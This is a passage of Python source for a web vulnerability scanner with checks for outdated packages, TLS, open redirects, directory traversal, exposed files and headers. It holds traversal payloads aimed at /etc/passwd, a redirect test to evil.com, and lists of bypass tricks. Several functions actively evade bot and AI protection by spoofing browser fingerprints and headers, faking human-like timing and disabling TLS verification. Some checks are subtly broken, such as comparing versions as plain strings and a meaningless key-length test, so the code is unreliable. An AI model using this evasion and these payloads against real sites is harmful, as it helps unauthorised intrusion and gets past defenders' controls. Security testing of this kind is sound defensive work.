            print(f"Error in component version check: {str(e)}")
            
    def _check_npm_vulnerability(self, package: str, version: str):
        """Check NPM package for known vulnerabilities"""
        try:
            # Query NPM registry
            registry_url = f"https://registry.npmjs.org/{package}"
            response = requests.get(registry_url)
            if response.status_code == 200:
                data = response.json()
                latest_version = data.get('dist-tags', {}).get('latest')
                
                if latest_version and version.replace('^', '').replace('~', '') < latest_version:
                    self._add_vulnerability(
                        "Outdated NPM Package",
                        f"Package {package} version {version} is outdated (latest: {latest_version})",
                        "MEDIUM",
                        evidence=f"Current: {version}, Latest: {latest_version}",
                        remediation=f"Update to version {latest_version}"
                    )
        except Exception as e:
            print(f"Error checking NPM vulnerability: {str(e)}")
            
    def _check_python_vulnerability(self, package: str, version: str):
        """Check Python package for known vulnerabilities"""
        try:
            # Query PyPI
            pypi_url = f"https://pypi.org/pypi/{package}/json"
            response = requests.get(pypi_url)
            if response.status_code == 200:
                data = response.json()
                latest_version = data.get('info', {}).get('version')
                
                if latest_version and version < latest_version:
                    self._add_vulnerability(
                        "Outdated Python Package",
                        f"Package {package} version {version} is outdated (latest: {latest_version})",
                        "MEDIUM",
                        evidence=f"Current: {version}, Latest: {latest_version}",
                        remediation=f"Update to version {latest_version}"
                    )
        except Exception as e:
            print(f"Error checking Python vulnerability: {str(e)}")
            
    def _check_composer_vulnerability(self, package: str, version: str):
        """Check Composer package for known vulnerabilities"""
        try:
            # Query Packagist
            packagist_url = f"https://repo.packagist.org/p2/{package}.json"
            response = requests.get(packagist_url)
            if response.status_code == 200:
                data = response.json()
                packages = data.get('packages', {}).get(package, [])
                if packages:
                    latest_version = packages[0].get('version')
                    
                    if latest_version and version.replace('^', '').replace('~', '') < latest_version:
                        self._add_vulnerability(
                            "Outdated Composer Package",
                            f"Package {package} version {version} is outdated (latest: {latest_version})",
                            "MEDIUM",
                            evidence=f"Current: {version}, Latest: {latest_version}",
                            remediation=f"Update to version {latest_version}"
                        )
        except Exception as e:
            print(f"Error checking Composer vulnerability: {str(e)}")
            
    def _check_crypto_implementation(self, url):
        """Check for cryptographic implementation vulnerabilities"""
        print(f"Checking cryptographic implementation for: {url}")

        try:
            parsed = urllib.parse.urlparse(url)
            if parsed.scheme == 'https':
                hostname = parsed.netloc
                port = parsed.port or 443

                # Create SSL context and connect
                context = ssl.create_default_context()
                with socket.create_connection((hostname, port)) as sock:
                    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                        # Check SSL/TLS version
                        version = ssock.version()
                        if version in ['TLSv1', 'TLSv1.1', 'SSLv2', 'SSLv3']:
                            self._add_vulnerability(
                                "Weak SSL/TLS Version",
                                f"Server is using outdated {version} protocol",
                                "HIGH",
                                evidence=f"Detected {version}",
                                remediation="Upgrade to TLS 1.2 or higher"
                            )

                        # Check cipher suite
                        cipher = ssock.cipher()
                        weak_ciphers = ['RC4', 'DES', '3DES', 'MD5']
                        for weak in weak_ciphers:
                            if weak in cipher[0]:
                                self._add_vulnerability(
                                    "Weak Cipher Suite",
                                    f"Server is using weak cipher: {cipher[0]}",
                                    "HIGH",
                                    evidence=f"Detected cipher: {cipher[0]}",
                                    remediation="Configure server to use strong cipher suites"
                                )

                        # Check certificate
                        cert = ssock.getpeercert()
                        if cert:
                            # Check key length
                            if 'subjectPublicKeyInfo' in cert:
                                key_length = len(cert['subjectPublicKeyInfo'])
                                if key_length < 2048:
                                    self._add_vulnerability(
                                        "Weak Key Length",
                                        f"Server certificate uses weak key length: {key_length} bits",
                                        "HIGH",
                                        evidence=f"Key length: {key_length} bits",
                                        remediation="Use RSA keys of at least 2048 bits"
                                    )

                            # Check certificate expiration
                            not_after = ssl.cert_time_to_seconds(cert['notAfter'])
                            if time.time() > not_after:
                                self._add_vulnerability(
                                    "Expired Certificate",
                                    "Server certificate has expired",
                                    "HIGH",
                                    evidence=f"Expiration date: {cert['notAfter']}",
                                    remediation="Renew SSL certificate"
                                )

        except ssl.SSLError as e:
            self._add_vulnerability(
                "SSL/TLS Configuration Error",
                f"SSL/TLS configuration error: {str(e)}",
                "HIGH",
                evidence=str(e),
                remediation="Review and fix SSL/TLS configuration"
            )
        except Exception as e:
            print(f"Error in crypto implementation check: {str(e)}")

    def _check_open_redirect(self, url):
        """Check for open redirect vulnerabilities"""
        print(f"Checking open redirect for: {url}")
        
        test_url = "https://evil.com"
        redirect_params = ["redirect", "url", "next", "return", "return_to", "goto", "to"]
        
        for param in redirect_params:
            if self.stop_scan:
                return
                
            try:
                test_full_url = f"{url}?{param}={urllib.parse.quote(test_url)}"
                self.scan_results["scan_details"]["total_requests"] += 1
                
                response = self.session.get(test_full_url, headers=self.headers, timeout=10, allow_redirects=False)
                
                if response.status_code in [301, 302, 303, 307, 308]:
                    location = response.headers.get('Location', '')
                    if test_url in location:
                        self._add_vulnerability(
                            "Open Redirect",
                            f"Open redirect vulnerability found at {url} using parameter {param}",
                            "MEDIUM"
                        )
                        self.scan_results["scan_details"]["successful_requests"] += 1
                        return
                        
                self.scan_results["scan_details"]["successful_requests"] += 1
            except Exception as e:
                self.scan_results["scan_details"]["failed_requests"] += 1
                print(f"Error checking open redirect: {str(e)}")

    def _check_directory_traversal(self, url):
        """Check for directory traversal vulnerabilities"""
        print(f"Checking directory traversal vulnerabilities for: {url}")
        
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd"
        ]
        
        for payload in payloads:
            if self.stop_scan:
                return
                
            try:
                test_url = f"{url}?file={urllib.parse.quote(payload)}"
                self.scan_results["scan_details"]["total_requests"] += 1
                
                response = self.session.get(test_url, headers=self.headers, timeout=10)
                
                
                if response.status_code == 200:
                    if "root:" in response.text or "[boot loader]" in response.text:
                        response_excerpt = response.text[:100] if len(response.text) > 100 else response.text
                        param_name = "file"
                        
                        bypass_techniques = """
                        Directory Traversal Bypass Techniques:
                        1. Use URL encoding: %2e%2e%2f instead of ../
                        2. Use double URL encoding: %252e%252e%252f instead of ../
                        3. Use UTF-8 encoding: ..%c0%af instead of ../
                        4. Use alternate path separators: ..\\/ or ../ or ..\\
                        5. Use nested traversal sequences: ....// (becomes ../ after normalization)
                        6. Use non-standard encodings: ..%u2215 or ..%c0%af
                        7. Use path parameter injection: /file;/../../../etc/passwd
                        8. Use null byte injection: ../../../etc/passwd%00.png
                        9. Use excessive directory traversal: ../../../../../../../../etc/passwd
                        10. Use absolute paths when possible: /etc/passwd
                        """
                        
                        remediation = """
                        Directory Traversal Remediation Steps:
                        1. Use a whitelist of allowed files/directories
                        2. Implement proper input validation and sanitization
                        3. Use path canonicalization before validation
                        4. Avoid using user input in filesystem operations
                        5. Use programming language security features (e.g., Path.Resolve in Node.js)
                        6. Implement proper file access controls
                        7. Use a web application firewall with path traversal protection
                        8. Run web applications with minimal privileges
                        9. Use virtual file systems or sandboxed environments
                        10. Implement proper error handling to avoid information disclosure
                        """
                        
                        self._add_vulnerability(
                            "Directory Traversal",
                            f"Directory traversal vulnerability found at {url} in parameter {param_name}",
                            "HIGH",
                            evidence=f"Payload: {payload}, Response: {response_excerpt}",
                            remediation=remediation
                        )
                        self.scan_results["scan_details"]["successful_requests"] += 1
                        return
                        
                self.scan_results["scan_details"]["successful_requests"] += 1
            except Exception as e:
                self.scan_results["scan_details"]["failed_requests"] += 1
                print(f"Error checking directory traversal: {str(e)}")

    def _check_sensitive_files(self, url):
        """Check for sensitive file exposure"""
        print(f"Checking sensitive files for: {url}")
        
        sensitive_files = [
            "/.env",
            "/.git/config",
            "/wp-config.php",
            "/config.php",
            "/phpinfo.php",
            "/robots.txt",
            "/.htaccess",
            "/server-status",
            "/backup",
            "/admin",
            "/debug"
        ]
        
        base_url = urllib.parse.urljoin(url, '/')
        
        for file_path in sensitive_files:
            if self.stop_scan:
                return
                
            try:
                test_url = urllib.parse.urljoin(base_url, file_path)
                self.scan_results["scan_details"]["total_requests"] += 1
                
                response = self.session.get(test_url, headers=self.headers, timeout=10)
                
                if response.status_code == 200:
                    self._add_vulnerability(
                        "Sensitive File Exposure",
                        f"Sensitive file found: {test_url}",
                        "MEDIUM"
                    )
                    self.scan_results["scan_details"]["successful_requests"] += 1
                else:
                    self.scan_results["scan_details"]["failed_requests"] += 1
            except Exception as e:
                self.scan_results["scan_details"]["failed_requests"] += 1
                print(f"Error checking sensitive files: {str(e)}")

    def _check_security_headers(self, url):
        """Check for missing security headers"""
        print(f"Checking security headers for: {url}")
        
        try:
            self.scan_results["scan_details"]["total_requests"] += 1
            response = self.session.get(url, headers=self.headers, timeout=10)
            
            security_headers = {
                'Strict-Transport-Security': 'Missing HSTS header',
                'X-Frame-Options': 'Missing clickjacking protection',
                'X-Content-Type-Options': 'Missing MIME-type protection',
                'X-XSS-Protection': 'Missing XSS protection header',
                'Content-Security-Policy': 'Missing CSP header'
            }
            
            for header, message in security_headers.items():
                if header not in response.headers:
                    self._add_vulnerability(
                        "Missing Security Header",
                        f"{message} ({header}) at {url}",
                        "LOW"
                    )
            
            self.scan_results["scan_details"]["successful_requests"] += 1
        except Exception as e:
            self.scan_results["scan_details"]["failed_requests"] += 1
            print(f"Error checking security headers: {str(e)}")

    def _check_logging_monitoring(self):
        """Check for security logging and monitoring capabilities"""
        print("Checking logging and monitoring capabilities...")

        try:
            # Check for log configuration files
            log_files = [
                '/var/log/auth.log',
                '/var/log/syslog',
                '/var/log/apache2/access.log',
                '/var/log/nginx/access.log',
                'C:\\Windows\\System32\\winevt\\Logs\\Security.evtx',
                'C:\\Windows\\System32\\winevt\\Logs\\Application.evtx'
            ]

            for log_file in log_files:
                if os.path.exists(log_file):
                    # Analyze log format and content
                    try:
                        with open(log_file, 'r') as f:
                            log_content = f.read(1024)  # Read first 1KB
                            if not self._validate_log_format(log_content):
                                self._add_vulnerability(
                                    "Improper Log Format",
                                    f"Log file {log_file} does not follow security logging best practices",
                                    "MEDIUM",
                                    evidence="Invalid log format detected",
                                    remediation="Implement structured logging with proper security event tracking"
                                )
                    except Exception as e:
                        print(f"Error reading log file {log_file}: {str(e)}")

            # Check for monitoring tools and configurations
            monitoring_paths = [
                '/etc/auditd/auditd.conf',
                '/etc/rsyslog.conf',
                '/etc/logrotate.d/',
                'C:\\Program Files\\SIEM\\',
                'C:\\Program Files\\Monitoring\\'
            ]

            monitoring_found = False
            for path in monitoring_paths:
                if os.path.exists(path):
                    monitoring_found = True
                    break

            if not monitoring_found:
                self._add_vulnerability(
                    "Missing Security Monitoring",
                    "No security monitoring system detected",
                    "HIGH",
                    evidence="No standard monitoring configurations found",
                    remediation="Implement a security monitoring solution (SIEM, IDS/IPS)"
                )

            # Check for alert mechanisms
            alert_configs = [
                '/etc/alertmanager/alertmanager.yml',
                '/etc/prometheus/alerts.rules',
                'C:\\ProgramData\\AlertSystem\\config.json'
            ]

            alerts_found = False
            for config in alert_configs:
                if os.path.exists(config):
                    alerts_found = True
                    break

            if not alerts_found:
                self._add_vulnerability(
                    "Missing Alert Mechanism",
                    "No security alert system detected",
                    "HIGH",
                    evidence="No alert configuration files found",
                    remediation="Implement security alert mechanisms for critical events"
                )

        except Exception as e:
            print(f"Error checking logging and monitoring: {str(e)}")

    def _validate_log_format(self, log_content: str) -> bool:
        """Validate if log format meets security requirements"""
        required_fields = ['timestamp', 'severity', 'event_id', 'source', 'message']
        
        # Simple check for common log format patterns
        has_timestamp = bool(re.search(r'\d{4}-\d{2}-\d{2}|\d{2}/\d{2}/\d{4}', log_content))
        has_severity = bool(re.search(r'ERROR|WARN|INFO|DEBUG|CRITICAL', log_content))
        has_source = bool(re.search(r'\[\w+\]|source=|from=', log_content))

        return has_timestamp and has_severity and has_source
        
    def _detect_ai_agents(self, url):
        """Detect AI security agents like MCP and attempt to bypass them"""
        print(f"Checking for AI security agents at: {url}")
        
        # Add to scan results
        vuln = {
            "name": "AI Security Agent Detection",
            "description": "Scanning for AI-based security systems",
            "severity": "INFO",
            "evidence": None,
            "remediation": None,
            "timestamp": datetime.now().isoformat(),
            "risk_score": 0
        }
        self.scan_results["vulnerabilities"].append(vuln)
        
        # Patterns that might indicate AI agent presence
        ai_patterns = [
            r'captcha',
            r'challenge',
            r'security.?verification',
            r'bot.?detection',
            r'human.?verification',
            r'machine.?learning',
            r'behavioral.?analysis',
            r'anomaly.?detection',
            r'mcp',
            r'ai.?security',
            r'intelligent.?protection'
        ]
        
        # Headers that might reveal AI security systems
        ai_headers = [
            'X-Bot-Protection',
            'X-AI-Security',
            'X-MCP-Version',
            'X-ML-Protection',
            'X-Intelligence-Layer',
            'X-Behavior-Analysis'
        ]
        
        try:
            # Make request with custom user agent to appear more human-like
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'DNT': '1',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
                'Cache-Control': 'max-age=0'
            }
            
            response = requests.get(url, headers=headers, timeout=10, verify=False)
            
            # Check response headers for AI security systems
            ai_header_found = False
            detection_method = None
            indicators = None
            
            for header in ai_headers:
                if header in response.headers:
                    detection_method = "Header analysis"
                    indicators = f"{header}: {response.headers[header]}"
                    vuln["evidence"] = f"AI security header detected: {header}: {response.headers[header]}"
                    vuln["severity"] = "MEDIUM"
                    vuln["risk_score"] = 60
                    vuln["description"] = f"AI-based security agent detected via headers: {header}"
                    ai_header_found = True
                    break
            
            # Check response content for AI security patterns
            if not ai_header_found:
                for pattern in ai_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        detection_method = "Content pattern analysis"
                        indicators = f"Pattern: {pattern}"
                        vuln["evidence"] = f"AI security pattern detected: {pattern}"
                        vuln["severity"] = "MEDIUM"
                        vuln["risk_score"] = 60
                        vuln["description"] = f"AI-based security agent detected via content pattern: {pattern}"
                        break
            
            # Check for behavioral analysis by making multiple requests with timing variations
            if not vuln["evidence"]:
                # Test for behavioral analysis by making requests with varying patterns
                timing_patterns = self._test_behavioral_analysis(url)
                if timing_patterns:
                    detection_method = "Behavioral analysis"
                    indicators = f"Timing patterns: {timing_patterns}"
                    vuln["evidence"] = f"Behavioral analysis detected: {timing_patterns}"
                    vuln["severity"] = "MEDIUM"
                    vuln["risk_score"] = 65
                    vuln["description"] = "AI-based behavioral analysis system detected"
            
            # Update scan summary and add detailed bypass/remediation if AI agent detected
            if vuln["evidence"]:
                self.scan_results["summary"]["ai_agents_detected"] = True
                self.scan_results["summary"]["ai_agent_details"] = vuln["description"]
                
                # Add detailed bypass techniques and remediation
                bypass_techniques = """
                AI Security Agent Bypass Techniques:
                1. Implement human-like behavior patterns with random timing between requests
                2. Use browser fingerprint spoofing to mimic legitimate users
                3. Gradually increase request frequency to avoid sudden traffic spikes
                4. Distribute requests across multiple source IPs
                5. Mimic mouse movements and scrolling behavior
                6. Add randomized delays between actions
                7. Use headless browser automation with realistic user-agent strings
                8. Implement session rotation and cookie management
                9. Use legitimate referrer headers from popular sites
                10. Avoid predictable request patterns by adding entropy
                """
                
                remediation = """
                AI Security Agent Hardening Steps:
                1. Implement multi-factor behavioral analysis
                2. Use CAPTCHA challenges for suspicious activities
                3. Implement progressive security measures based on risk score
                4. Combine multiple detection methods (fingerprinting, behavior analysis, request patterns)
                5. Use machine learning to continuously improve detection accuracy
                6. Implement rate limiting with exponential backoff
                7. Use browser fingerprinting beyond user-agent checking
                8. Implement honeypot fields to detect automated submissions
                9. Use JavaScript challenges that require human-like interaction
                10. Implement IP reputation scoring and blocking
                """
                
                self._add_vulnerability(
                    "AI Security Agent Detection",
                    f"AI-based security agent detected at {url}",
                    "MEDIUM",
                    evidence=f"Detection method: {detection_method}, Indicators: {indicators}",
                    bypass_techniques=bypass_techniques,
                    remediation=remediation
                )
            else:
                vuln["description"] = "No AI security agents detected"
                self.scan_results["summary"]["ai_agents_detected"] = False
                
        except Exception as e:
            vuln["description"] = f"Error during AI agent detection: {str(e)}"
            vuln["severity"] = "ERROR"
        
        return vuln["evidence"] is not None

    def _test_behavioral_analysis(self, url):
        """Test for AI behavioral analysis by making requests with varying patterns"""
        try:
            # Make a series of requests with different timing patterns
            patterns = []
            
            # Pattern 1: Rapid succession requests
            start_time = time.time()
            for _ in range(5):
                requests.get(url, timeout=5, verify=False)
            rapid_time = time.time() - start_time
            
            # Wait a bit
            time.sleep(2)
            
            # Pattern 2: Human-like interval requests
            start_time = time.time()
            for _ in range(5):
                requests.get(url, timeout=5, verify=False)
                time.sleep(random.uniform(1.5, 3.5))
            human_time = time.time() - start_time
            
            # Check if there's significant difference in response times or if we got blocked
            if rapid_time > human_time * 1.5:
                patterns.append(f"Rapid requests took {rapid_time:.2f}s vs human-like {human_time:.2f}s")
                return patterns
            
            return None
        except Exception as e:
            print(f"Error in behavioral analysis test: {str(e)}")
            return None

    def _bypass_ai_protection(self, url):
        """Attempt to bypass AI-based protection systems"""
        print(f"Attempting to bypass AI protection at: {url}")
        
        bypass_techniques = [
            self._technique_humanlike_behavior,
            self._technique_header_manipulation,
            self._technique_request_randomization,
            self._technique_fingerprint_spoofing
        ]
        
        for technique in bypass_techniques:
            result = technique(url)
            if result.get('success'):
                return result
        
        return {"success": False, "message": "Failed to bypass AI protection"}

    def _technique_humanlike_behavior(self, url):
        """Use human-like behavior patterns to bypass AI detection"""
        try:
            session = requests.Session()
            
            # First, visit the homepage
            session.get(url, timeout=10, verify=False)
            
            # Wait a human-like interval
            time.sleep(random.uniform(2, 5))
            
            # Move mouse-like behavior by visiting a few random pages
            for _ in range(random.randint(2, 4)):
                # Simulate clicking around
                random_path = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=6))
                session.get(f"{url}/{random_path}", timeout=10, verify=False)
                time.sleep(random.uniform(3, 7))
            
            # Now try the actual request
            response = session.get(url, timeout=10, verify=False)
            
            if response.status_code == 200:
                return {"success": True, "message": "Successfully bypassed using human-like behavior"}
            
            return {"success": False, "message": "Human-like behavior technique failed"}
        except Exception as e:
            return {"success": False, "message": f"Error: {str(e)}"}

    def _technique_header_manipulation(self, url):
        """Manipulate headers to appear as a legitimate browser"""
        try:
            # Use a common browser fingerprint
            headers = {
                'User-Agent': random.choice([
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15',
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0'
                ]),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Referer': 'https://www.google.com/',
                'DNT': '1',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'cross-site',
                'Sec-Fetch-User': '?1',
                'Cache-Control': 'max-age=0',
                'TE': 'trailers'
            }
            
            response = requests.get(url, headers=headers, timeout=10, verify=False)
            
            if response.status_code == 200:
                return {"success": True, "message": "Successfully bypassed using header manipulation"}
            
            return {"success": False, "message": "Header manipulation technique failed"}
        except Exception as e:
            return {"success": False, "message": f"Error: {str(e)}"}

    def _technique_request_randomization(self, url):
        """Randomize request patterns to avoid detection"""
        try:
            session = requests.Session()
            
            # Make requests with random intervals
            for _ in range(random.randint(3, 6)):
                session.get(url, timeout=10, verify=False)
                time.sleep(random.uniform(1, 4))
            
            # Try the actual request
            response = session.get(url, timeout=10, verify=False)
            
            if response.status_code == 200:
                return {"success": True, "message": "Successfully bypassed using request randomization"}
            
            return {"success": False, "message": "Request randomization technique failed"}
        except Exception as e:
            return {"success": False, "message": f"Error: {str(e)}"}

    def _technique_fingerprint_spoofing(self, url):
        """Spoof browser fingerprints to bypass AI detection"""
        try:
            # Create a session with random browser fingerprint
            session = requests.Session()
            
            # Random screen dimensions
            screens = [(1920, 1080), (1366, 768), (1440, 900), (1536, 864), (2560, 1440)]
            screen_width, screen_height = random.choice(screens)
            
            # Random platform
            platforms = ['Win32', 'MacIntel', 'Linux x86_64']
            
            # Create custom headers with JavaScript-like properties
            headers = {
                'User-Agent': random.choice([
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15',
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0'
                ]),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'X-Screen-Width': str(screen_width),
                'X-Screen-Height': str(screen_height),
                'X-Platform': random.choice(platforms),
                'X-Color-Depth': str(random.choice([24, 32])),
                'X-Timezone-Offset': str(random.randint(-720, 720)),
                'X-Has-Touch': str(random.choice(['true', 'false'])),
                'X-Browser-Language': random.choice(['en-US', 'en-GB', 'fr-FR', 'de-DE', 'es-ES']),
                'Referer': 'https://www.google.com/search?q=example+search+term',
            }
            
            response = session.get(url, headers=headers, timeout=10, verify=False)
            
            if response.status_code == 200:
                return {"success": True, "message": "Successfully bypassed using fingerprint spoofing"}
            
            return {"success": False, "message": "Fingerprint spoofing technique failed"}
        except Exception as e:
            return {"success": False, "message": f"Error: {str(e)}"}

    def generate_report(self):
        """Generate a detailed report of the scan results"""
        console = Console()
        
        # Summary Panel
        summary_table = Table(title="Scan Summary")
        summary_table.add_column("Severity", style="bold")
        summary_table.add_column("Count", justify="right")
        
        for severity, count in self.scan_results["summary"].items():
            summary_table.add_row(severity.capitalize(), str(count))
        
        console.print(Panel(summary_table, title="Vulnerability Summary"))
        
        # Detailed Findings
        findings_table = Table(title="Detailed Findings")
        findings_table.add_column("Severity", style="bold")
        findings_table.add_column("Vulnerability")
        findings_table.add_column("Description")
        
        for vuln in self.scan_results["vulnerabilities"]:
            findings_table.add_row(
                vuln["severity"],
                vuln["name"],
                vuln["description"]
            )
        
        console.print(Panel(findings_table, title="Detailed Findings"))
        
        # Scan Details
        details_table = Table(title="Scan Details")
        details_table.add_column("Metric")
        details_table.add_column("Value")
        
        details = self.scan_results["scan_details"]
        for key, value in details.items():
            details_table.add_row(key.replace("_", " ").title(), str(value))
        
        console.print(Panel(details_table, title="Scan Details"))
        
        # Save the report
        self.save_results()

    def save_results(self):
        """Save scan results to a JSON file"""
        # Create results directory if it doesn't exist
        if not os.path.exists("results"):
            os.makedirs("results")
        
        # Generate filename with timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        # Sanitize target for filename
        safe_target = re.sub(r'[^\w\-_.]', '_', self.target)
        filename = f"results/scan_{safe_target}_{timestamp}.json"
        
        try:
            with open(filename, 'w') as f:
                json.dump(self.scan_results, f, indent=2)
            print(f"\nScan results saved to: {filename}")
            return filename
        except Exception as e:
            print(f"Error saving results: {str(e)}")
            return None

    def _check_port(self, ip: str, port: int) -> Optional[Tuple[str, str, str]]:
        """Check if a port is open and identify service"""
        try:
            with socket.create_connection((ip, port), timeout=1) as sock:
                return (
                    "Open Port",
                    f"Port {port} is open on {ip}",
                    "MEDIUM"
                )
        except:
            return None

    def _add_vulnerability(self, name: str, description: str, severity: str, evidence: str = None, remediation: str = None, bypass_techniques: str = None):
        """Enhanced vulnerability tracking with evidence, remediation, and bypass techniques"""
        print(f"Adding vulnerability: {name} ({severity})")
        
        # Default remediation if none provided
        if remediation is None:
            remediation = "No specific remediation steps available."
        
        # Default bypass techniques if none provided
        if bypass_techniques is None:
            bypass_techniques = "No specific bypass techniques documented."
            
        vulnerability = {
            "name": name,
            "description": description,
            "severity": severity,
            "evidence": evidence,
            "remediation": remediation,
            "bypass_techniques": bypass_techniques,
            "timestamp": datetime.now().isoformat(),
            "risk_score": self.severity_weights.get(severity.upper(), 0)
        }
        
        self.scan_results["vulnerabilities"].append(vulnerability)
        self.scan_results["summary"][severity.lower()] += 1
        
        # Update overall risk score
        total_score = sum(vuln["risk_score"] for vuln in self.scan_results["vulnerabilities"])
        total_vulns = len(self.scan_results["vulnerabilities"])
        self.scan_results["risk_score"] = total_score / total_vulns if total_vulns > 0 else 0
        
        # Update scan details
        self.scan_results["scan_details"]["last_update"] = datetime.now().isoformat()
        
        return vulnerability

async def main():
    if len(sys.argv) < 2:
        print("Usage: python scanner.py <target> [--username USERNAME] [--password PASSWORD]")
        print("Target can be:")
        print("  - URL (e.g., https://example.com)")
        print("  - IP address (e.g., 192.168.1.1)")
        print("  - File or directory path (e.g., /path/to/code)")
        sys.exit(1)

    target = sys.argv[1]
    username = None
    password = None
    
    # Parse command line arguments
    for i in range(2, len(sys.argv)):
        if sys.argv[i] == "--username" and i + 1 < len(sys.argv):
            username = sys.argv[i + 1]
        elif sys.argv[i] == "--password" and i + 1 < len(sys.argv):
            password = sys.argv[i + 1]
    
    print(f"Starting deep vulnerability scan for target: {target}")
    
    scanner = VulnerabilityScanner(target, username, password)
    
    try:
        # Attempt authentication if credentials are provided
        if username and password:
            if scanner.authenticate():
                print("Authentication successful")
            else:
                print("Authentication failed")
        
        results = await scanner.scan()
        scanner.generate_report()
        
    except Exception as e:
        print(f"Error: {str(e)}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    asyncio.run(main())